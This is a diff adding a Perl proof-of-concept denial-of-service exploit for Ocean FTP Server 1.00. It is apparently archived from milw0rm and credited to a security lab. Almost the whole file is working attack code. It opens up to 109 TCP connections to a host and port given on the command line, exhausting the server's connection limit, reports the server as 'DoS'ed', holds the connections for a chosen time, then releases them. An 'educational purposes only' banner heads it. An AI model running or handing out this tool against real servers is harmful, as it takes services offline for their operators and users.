@@ -1,0 +1,70 @@
+#!/usr/bin/perl
+###############################
+# GSS-IT Research And Security Labs #
+###############################
+# #
+# www.gssit.co.il #
+# #
+###############################
+# Ocean FTP Server Ver 1.00 Denial Of Service POC #
+###############################
+# Use This PoC For Educational Purposes Only #
+###############################
+ 
+  
+use Socket;
+  
+
+if (($#ARGV) < 2)
+{
+print("#############################\n");
+print("# Ocean FTP Server Ver 1.00 Denial Of Service POC #\n");
+print("#############################\n\n");
+print("Use : \n\nperl $0 [Host] [Port] [Sleep] \n");
+exit
+}
+
+print("#############################\n");
+print("# Ocean FTP Server Ver 1.00 Denial Of Service POC #\n");
+print("#############################\n");
+
+
+$host = $ARGV[0];
+$port = $ARGV[1];
+$slp = $ARGV[2];
+$proto = getprotobyname('tcp');
+
+
+for ($i=1; $i<110; $i++)
+{
+  socket($i, PF_INET, SOCK_STREAM, $proto );
+  $dest = sockaddr_in ($port, inet_aton($host));
+  if (!(connect($i, $dest)))
+  {
+   Slp();
+  }
+ 
+}
+
+print("==> Unsuccesful <==");
+exit;
+
+
+sub Slp
+
+{
+
+ print("\n\nServer $host Has Been Successfully DoS'ed\n\n");
+ print("The Server Will Be Down For $slp Seconds\n\n");
+ sleep ($slp);
+ 
+ print("==> Killing Connections ...<==\n");
+ for ($j=1; $j<110; $j++)
+  {
+   shutdown($j,2);
+  }
+ print ("[#] Back To Work Server Up [#] ");
+ exit;
+}
+
+# milw0rm.com [2005-03-21]
